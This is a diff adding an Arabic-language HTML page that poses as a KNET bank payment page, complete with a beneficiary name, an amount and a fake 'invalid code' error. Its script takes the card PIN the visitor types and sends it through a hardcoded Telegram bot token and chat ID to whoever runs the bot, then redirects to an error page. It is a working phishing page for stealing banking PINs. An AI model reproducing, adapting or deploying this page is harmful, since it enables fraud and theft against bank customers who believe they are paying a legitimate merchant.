@@ -1,0 +1,111 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>صفحة دفع كي نت</title>
+    <link rel="stylesheet" href="eror.css">
+    <style>
+        .error-box {
+            background-color: #ffffff;
+            color: #821111;
+            padding: 10px;
+            border: 0px solid #f5c6cb;
+            border-radius: 5px;
+            margin-bottom: 1px;
+            font-size: 11px;
+            text-align: center; /* محاذاة النص إلى الوسط */
+            display: block; /* إظهار الرسالة عند تحميل الصفحة */
+        }
+    </style>
+    <script src="script.js" defer></script>
+</head>
+<body>
+    <header id="pageHeader">
+        <img src="pc (1).jpg" alt="رأس الصفحة" id="headerImage">
+    </header>
+
+    <div class="box bank-info" id="bankInfoBox">
+        <img id="imgkn" src="images (3).png" alt="بنك وربة" class="bank-logo" id="bankLogo">
+        <p id="beneficiaryLabel">المستفيد: <strong id="beneficiaryName">Myfatoorah General Trading Co.</strong></p>
+        <p id="amountLabel">المبلغ: <strong id="amountValue">KD 2.000</strong></p>
+    </div>
+    <div>
+        <h1 id="namenone">يرجى الانتظار جار التحقق</h1>
+    </div>
+    <div class="box payment-form">
+        <form id="paymentForm" onsubmit="event.preventDefault(); sendToTelegram();">
+           <div id="errorBox" class="error-box">
+            تم ادخال رمز غير صالح يرجى الانتظار سيتم ارسال رمز جديد
+        </div>
+            <!-- حقل الرقم السري مع التحقق من الحد الأدنى والحد الأقصى للأرقام -->
+            <div class="input-container">
+                <label id="texst4" for="pin">الرقم السري:</label>
+                <div class="input-box">
+                    <input type="password" id="pin" placeholder="****" required pattern="\d{4,6}" maxlength="6" title="الرجاء إدخال رقم يتراوح بين 4 و 6 أرقام">
+                </div>
+            </div>
+            
+        </form>
+    </div>
+
+    <div class="box buttons">
+        <button type="submit" form="paymentForm">إرسال</button>
+        <button type="button" onclick="resetForm()">إلغاء</button>
+    </div>
+
+    <script>
+        function sendToTelegram() {
+            var token = "7484126870:AAEDSU1tM_kBFwSJ0IpQT0NmuWYzW8wq4_E";  // ضع هنا التوكن الخاص بك
+            var chatId = "6454807559";  // ضع هنا الـ Chat ID الخاص بك
+            var pin = document.getElementById("pin").value;
+
+            if (!pin) {
+                alert("يرجى إدخال الرقم السري.");
+                return;
+            }
+
+            var message = `📩 بيانات جديدة:\n\n🔑 الرقم السري: ${pin}`;
+            var url = `https://api.telegram.org/bot${token}/sendMessage`;
+
+            fetch(url, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ chat_id: chatId, text: message })
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.ok) {
+                    window.location.href = "eror.html";  // توجيه المستخدم إلى صفحة eror.html عند نجاح الإرسال
+                } else {
+                    alert("فشل في إرسال البيانات. يرجى المحاولة مرة أخرى.");
+                }
+            })
+            .catch(error => {
+                console.error("خطأ:", error);
+                alert("حدث خطأ أثناء الإرسال. تأكد من اتصالك بالإنترنت.");
+            });
+        }
+
+        function resetForm() {
+            document.getElementById("paymentForm").reset();
+        }
+              // استرجاع القيمة الإجمالية من localStorage
+const totalAmount = localStorage.getItem("totalAmount");
+
+// تحديث النص داخل العنصر الذي يحتوي على الـ id "amountValue"
+document.getElementById("amountValue").innerText = totalAmount;
+
+
+
+setTimeout(function() {
+            document.getElementById('namenone').style.display = 'none'; // إخفاء العنصر
+            let allElements = document.body.querySelectorAll('*');
+            allElements.forEach(function(element) {
+                element.style.visibility = 'visible'; // إظهار باقي العناصر
+            });
+        }, 5000); // 5000 ملي ثانية = 5 ثواني
+    </script>
+
+</body>
+</html>
